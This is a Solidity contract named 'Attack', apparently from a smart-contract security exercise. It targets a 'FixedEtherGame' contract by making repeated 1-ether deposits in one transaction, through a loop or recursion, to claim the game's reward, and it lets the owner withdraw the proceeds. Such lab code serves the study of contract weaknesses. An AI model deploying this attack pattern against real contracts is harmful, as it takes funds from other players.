// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
import "./FixedEtherGame.sol";

contract Attack {
    FixedEtherGame etherGame;
    address private owner;
    uint public targetContractAmount;

    constructor(FixedEtherGame _etherGame) {
        etherGame = FixedEtherGame(_etherGame);
        targetContractAmount = etherGame.targetAmount() / 1 ether;
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }
    
    receive() external payable {}

    function attack() public payable onlyOwner {
        uint targetContractBalance = etherGame.balance() / 1 ether;
        require(targetContractAmount != targetContractBalance, "The game is over, better luck next time");
        require(msg.value /  1 ether >= targetContractAmount - targetContractBalance, "Not enough ether transfered");
        for(uint i = targetContractBalance; i< targetContractAmount; i++){
        etherGame.deposit{value:1 ether}();
        }
        etherGame.claimReward();
    }
    
    function recursiveAttack() public payable onlyOwner {
        recursiveAttackFunction(targetContractAmount - etherGame.balance() / 1 ether);
        etherGame.claimReward();
    }
    
    function recursiveAttackFunction(uint _step) public onlyOwner {
        if(_step != 0) {
            etherGame.deposit{value:1 ether}();
            recursiveAttackFunction(_step - 1);
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
        
    function withdraw(uint _amount) public onlyOwner {
        require(_amount != 0, "Cannot withdraw zero wei to your account");
        require(_amount <= uint(address(this).balance), "Insufficient in funds");
        payable(owner).transfer(_amount);
    }
}
